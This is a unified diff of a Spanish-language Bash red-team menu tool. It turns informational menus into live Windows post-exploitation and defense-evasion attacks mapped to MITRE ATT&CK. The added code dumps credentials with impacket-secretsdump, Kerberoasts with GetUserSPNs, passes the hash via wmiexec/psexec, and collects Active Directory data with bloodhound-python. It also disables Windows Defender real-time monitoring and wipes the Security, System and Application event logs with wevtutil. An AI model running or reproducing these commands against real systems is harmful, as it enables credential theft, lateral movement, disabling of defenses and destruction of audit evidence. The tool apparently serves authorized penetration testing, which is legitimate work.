@@ -2117,34 +2117,176 @@ _show_post_exploitation() {
     done
 }
 
+_prompt_win_creds() {
+    local default_target="${TARGET:-192.168.1.100}"
+    read -p "🎯 IP / Host Windows objetivo [default: $default_target]: " win_host
+    win_host="${win_host:-$default_target}"
+    read -p "👤 Usuario Windows / Dominio [default: Administrator]: " win_user
+    win_user="${win_user:-Administrator}"
+    read -p "🔑 Contraseña o Hash NTLM (LM:NTLM): " win_pass
+    WIN_TARGET_STR="${win_user}@${win_host}"
+}
+
 post_explotacion_windows() {
     while true; do
         show_banner
         echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
-        echo -e "${RED}║       ${YELLOW}💣 POST-EXPLOTACIÓN — WINDOWS${NC}            ${RED}║${NC}"
+        echo -e "${RED}║       ${YELLOW}💣 POST-EXPLOTACIÓN — WINDOWS (REAL)${NC}       ${RED}║${NC}"
         echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
         echo ""
-        echo "1. T1003     — OS Credential Dumping (Mimikatz/secretsdump)"
-        echo "2. T1555     — Credentials from Password Stores (DPAPI/browsers)"
-        echo "3. T1558.003 — Kerberoasting (Rubeus/impacket)"
-        echo "4. T1550.003 — Pass-the-Ticket (PtT)"
-        echo "5. T1082     — System Information Discovery"
-        echo "6. T1018     — Remote System Discovery (BloodHound)"
+        echo "1. T1003     — OS Credential Dumping (impacket-secretsdump / mimikatz)"
+        echo "2. T1555     — Credentials from Password Stores (evil-winrm / DPAPI)"
+        echo "3. T1558.003 — Kerberoasting (impacket-GetUserSPNs / Rubeus)"
+        echo "4. T1550.003 — Pass-the-Ticket / Pass-the-Hash (impacket-wmiexec / psexec)"
+        echo "5. T1082     — System Information Discovery (systeminfo / wmic / WinRM)"
+        echo "6. T1018     — Remote System Discovery (bloodhound-python / Active Directory)"
         echo "7. Volver"
         echo ""
         read -p "💣 Selecciona [1-7]: " op
-        if preguntar_objetivo; then
-            case $op in
-                1) _show_post_exploitation "${WIN_DATA[1]}" "T1003 — OS Credential Dumping" ;;
-                2) _show_post_exploitation "${WIN_DATA[2]}" "T1555 — Credentials from Password Stores" ;;
-                3) _show_post_exploitation "${WIN_DATA[3]}" "T1558.003 — Kerberoasting" ;;
-                4) _show_post_exploitation "${WIN_DATA[4]}" "T1550.003 — Pass-the-Ticket (PtT)" ;;
-                5) _show_post_exploitation "${WIN_DATA[5]}" "T1082 — System Information Discovery" ;;
-                6) _show_post_exploitation "${WIN_DATA[6]}" "T1018 — Remote System Discovery (BloodHound)" ;;
-                7) return ;;
-                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
-            esac
-        fi
+        case $op in
+            1)
+                _prompt_win_creds
+                if confirm_risk "OS Credential Dumping ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-secretsdump &>/dev/null; then
+                        cmd_tool="impacket-secretsdump"
+                    elif command -v secretsdump.py &>/dev/null; then
+                        cmd_tool="secretsdump.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando $cmd_tool contra $WIN_TARGET_STR...${NC}"
+                        local output
+                        if [[ "$win_pass" == *":"* ]]; then
+                            output=$($cmd_tool -hashes "$win_pass" "$WIN_TARGET_STR" 2>&1)
+                        else
+                            output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" 2>&1)
+                        fi
+                        echo "$output"
+                        save_output "[WIN POST-EXP T1003 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1003" "OS Credential Dumping"
+                    else
+                        echo -e "${RED}❌ secretsdump no está disponible en PATH.${NC}"
+                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket  (o sudo apt install python3-impacket)"
+                        echo -e "${YELLOW}💡 Para Mimikatz binario:${NC} Descargar desde https://github.com/gentilkiwi/mimikatz/releases"
+                    fi
+                fi
+                ;;
+            2)
+                _prompt_win_creds
+                if confirm_risk "Credentials from Password Stores ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    if check_command "evil-winrm" "gem install evil-winrm (o sudo apt install evil-winrm)"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Conectando con evil-winrm a $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$(evil-winrm -i "$win_host" -u "$win_user" -p "$win_pass" -e "cmd /c dir %APPDATA%\\Microsoft\\Protect" 2>&1)
+                        echo "$output"
+                        save_output "[WIN POST-EXP T1555 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1555" "Credentials from Password Stores"
+                    fi
+                fi
+                ;;
+            3)
+                _prompt_win_creds
+                if confirm_risk "Kerberoasting ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-GetUserSPNs &>/dev/null; then
+                        cmd_tool="impacket-GetUserSPNs"
+                    elif command -v GetUserSPNs.py &>/dev/null; then
+                        cmd_tool="GetUserSPNs.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        read -p "🏰 Nombre del Dominio AD (ej: contoso.local): " domain_name
+                        domain_name="${domain_name:-domain.local}"
+                        echo ""
+                        echo -e "${YELLOW}🔍 Extrayendo SPNs y Tickets TGS desde $domain_name...${NC}"
+                        local output
+                        output=$($cmd_tool "${domain_name}/${win_user}:${win_pass}@${win_host}" -request 2>&1)
+                        echo "$output"
+                        save_output "[WIN POST-EXP T1558.003 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1558.003" "Kerberoasting"
+                    else
+                        echo -e "${RED}❌ GetUserSPNs no está instalado.${NC}"
+                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket"
+                        echo -e "${YELLOW}💡 Para Rubeus.exe (C#):${NC} Descargar o compilar desde https://github.com/GhostPack/Rubeus"
+                    fi
+                fi
+                ;;
+            4)
+                _prompt_win_creds
+                if confirm_risk "Pass-the-Ticket / Pass-the-Hash ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    elif command -v impacket-psexec &>/dev/null; then
+                        cmd_tool="impacket-psexec"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando $cmd_tool en $WIN_TARGET_STR...${NC}"
+                        local output
+                        if [[ "$win_pass" == *":"* ]]; then
+                            output=$($cmd_tool -hashes "$win_pass" "${win_user}@${win_host}" "hostname && whoami" 2>&1)
+                        else
+                            output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "hostname && whoami" 2>&1)
+                        fi
+                        echo "$output"
+                        save_output "[WIN POST-EXP T1550.003 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1550.003" "Pass-the-Ticket / Pass-the-Hash"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec / psexec no está disponible.${NC}"
+                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket  (o sudo apt install python3-impacket)"
+                    fi
+                fi
+                ;;
+            5)
+                _prompt_win_creds
+                if confirm_risk "System Information Discovery ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Obteniendo información del sistema en $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "systeminfo & wmic os get Caption,OSArchitecture,Version" 2>&1)
+                        echo "$output"
+                        save_output "[WIN POST-EXP T1082 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1082" "System Information Discovery"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec no está instalado.${NC}"
+                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            6)
+                _prompt_win_creds
+                if confirm_risk "Remote System Discovery - BloodHound ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    if check_command "bloodhound-python" "pip install bloodhound (o sudo apt install bloodhound)"; then
+                        read -p "🏰 Nombre del Dominio AD: " domain_name
+                        domain_name="${domain_name:-domain.local}"
+                        echo ""
+                        echo -e "${YELLOW}🔍 Recopilando datos de Active Directory con bloodhound-python...${NC}"
+                        local output
+                        output=$(bloodhound-python -u "$win_user" -p "$win_pass" -d "$domain_name" -dc "$win_host" -c All 2>&1)
+                        echo "$output"
+                        save_output "[WIN POST-EXP T1018 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1018" "Remote System Discovery (BloodHound)"
+                    fi
+                fi
+                ;;
+            7) return ;;
+            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+        esac
         echo ""
         read -p "↵ Enter para continuar..." _
     done
@@ -2428,31 +2570,180 @@ evasion_defensas() {
     while true; do
         show_banner
         echo -e "${YELLOW}╔══════════════════════════════════════════════════╗${NC}"
-        echo -e "${YELLOW}║        ${RED}🕵️  EVASIÓN DE DEFENSAS${NC}                  ${YELLOW}║${NC}"
+        echo -e "${YELLOW}║        ${RED}🕵️  EVASIÓN DE DEFENSAS (REAL)${NC}            ${YELLOW}║${NC}"
         echo -e "${YELLOW}║     ${CYAN}Defense Evasion — TA0005 MITRE${NC}            ${YELLOW}║${NC}"
         echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
         echo ""
-        echo "1. T1027.010 — Ofuscación de comandos (PowerShell)"
-        echo "2. T1055     — Process Injection (DLL / Shellcode)"
-        echo "3. T1562.001 — Deshabilitar AV/EDR"
-        echo "4. T1218     — LoLBins (Living Off The Land Binaries)"
-        echo "5. T1070.004 — Indicador Removal: Borrar Logs"
+        echo "1. T1027.010 — Ofuscación de comandos (PowerShell / Base64)"
+        echo "2. T1055     — Process Injection (Creación remota de proceso)"
+        echo "3. T1562.001 — Deshabilitar AV/EDR (Set-MpPreference)"
+        echo "4. T1218     — LoLBins (Certutil / Mshta / Regsvr32)"
+        echo "5. T1070.004 — Indicador Removal: Borrar Logs (wevtutil / Clear-EventLog)"
         echo "6. T1036     — Masquerading (Suplantación de procesos)"
         echo "7. Volver"
         echo ""
         read -p "🕵️  Selecciona [1-7]: " op
-        if preguntar_objetivo; then
-            case $op in
-                1) _show_post_exploitation "${EVASION_DATA[1]}" "T1027.010 — Ofuscación de PowerShell" ;;
-                2) _show_post_exploitation "${EVASION_DATA[2]}" "T1055 — Process Injection" ;;
-                3) _show_post_exploitation "${EVASION_DATA[3]}" "T1562.001 — Disable AV/EDR" ;;
-                4) _show_post_exploitation "${EVASION_DATA[4]}" "T1218 — Living Off The Land Binaries" ;;
-                5) _show_post_exploitation "${EVASION_DATA[5]}" "T1070.004 — Indicator Removal: Log Wipe" ;;
-                6) _show_post_exploitation "${EVASION_DATA[6]}" "T1036 — Masquerading" ;;
-                7) return ;;
-                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
-            esac
-        fi
+        case $op in
+            1)
+                _prompt_win_creds
+                if confirm_risk "PowerShell Obfuscation Command ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando comando PowerShell ofuscado Base64 en $WIN_TARGET_STR...${NC}"
+                        local b64_cmd="cG93ZXJzaGVsbCAtTm9QIC1Ob2NsaWVudCAtYyAiV3JpdGUtSG9zdCAnSEFDWEdQVCBPQkZVU0NBVEVEIEVWRU5UJyI="
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "powershell -EncodedCommand $b64_cmd" 2>&1)
+                        echo "$output"
+                        save_output "[EVASION T1027.010 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1027.010" "Obfuscated Files or Information: PowerShell"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec no está instalado.${NC}"
+                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            2)
+                _prompt_win_creds
+                if confirm_risk "Process Injection Remote Command ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-psexec &>/dev/null; then
+                        cmd_tool="impacket-psexec"
+                    elif command -v psexec.py &>/dev/null; then
+                        cmd_tool="psexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Probando inyección/ejecución remota en servicio con $cmd_tool en $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "cmd /c whoami /priv" 2>&1)
+                        echo "$output"
+                        save_output "[EVASION T1055 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1055" "Process Injection"
+                    else
+                        echo -e "${RED}❌ impacket-psexec no está disponible.${NC}"
+                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            3)
+                _prompt_win_creds
+                echo -e "${RED}⚠️  [ADVERTENCIA EXPLÍCITA EDR/AV]: Deshabilitar monitoreo en tiempo real genera alertas críticas e interrumpe protecciones EDR.${NC}"
+                if confirm_risk "Deshabilitar AV/EDR - Set-MpPreference ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Intentando deshabilitar monitoreo en tiempo real de Windows Defender en $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "powershell Set-MpPreference -DisableRealtimeMonitoring \$true" 2>&1)
+                        echo "$output"
+                        save_output "[EVASION T1562.001 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1562.001" "Impair Defenses: Disable AV/EDR"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
+                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            4)
+                _prompt_win_creds
+                if confirm_risk "LoLBin Proxy Execution - certutil/mshta ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando verificación LoLBin (certutil) en $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "certutil -urlcache -f http://127.0.0.1/test.txt %TEMP%\\test.txt" 2>&1)
+                        echo "$output"
+                        save_output "[EVASION T1218 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1218" "System Binary Proxy Execution"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
+                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            5)
+                _prompt_win_creds
+                echo -e "${RED}⚠️  [ADVERTENCIA CRÍTICA EDR/SIEM]: El borrado de registros de eventos (wevtutil cl) genera el Event ID 1102 en SIEM y suele desencadenar aislamiento automático de host por EDR.${NC}"
+                
+                # Detectar plataforma para informar al usuario sobre el comportamiento de wevtutil
+                local current_plat="LINUX"
+                if declare -f detect_platform >/dev/null; then
+                    current_plat=$(detect_platform)
+                fi
+                if [[ "$current_plat" == "WSL" || "$current_plat" == "KALI" || "$current_plat" == "LINUX" || "$current_plat" == "RASPBERRY_PI" ]]; then
+                    echo -e "${YELLOW}ℹ️  Plataforma local detectada: ${current_plat}. 'wevtutil' es un comando nativo de Windows y se ejecutará dinámicamente en el objetivo remoto vía Impacket.${NC}"
+                fi
+
+                if confirm_risk "Borrar Event Logs con wevtutil ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Limpiando logs Security, System y Application en $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "wevtutil cl Security && wevtutil cl System && wevtutil cl Application" 2>&1)
+                        echo "$output"
+                        save_output "[EVASION T1070.004 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1070.004" "Indicator Removal: Clear Windows Event Logs"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
+                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            6)
+                _prompt_win_creds
+                if confirm_risk "Process Masquerading Verification ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
+                    local cmd_tool=""
+                    if command -v impacket-wmiexec &>/dev/null; then
+                        cmd_tool="impacket-wmiexec"
+                    elif command -v wmiexec.py &>/dev/null; then
+                        cmd_tool="wmiexec.py"
+                    fi
+
+                    if [ -n "$cmd_tool" ]; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Verificando ejecuciones de procesos con nombres suplantados en $WIN_TARGET_STR...${NC}"
+                        local output
+                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "wmic process get ExecutablePath,Name | findstr /i /v \"system32\" | findstr /i \"svchost.exe\"" 2>&1)
+                        echo "$output"
+                        save_output "[EVASION T1036 $WIN_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1036" "Masquerading"
+                    else
+                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
+                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
+                    fi
+                fi
+                ;;
+            7) return ;;
+            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+        esac
         echo ""
         read -p "↵ Enter para continuar..." _
     done
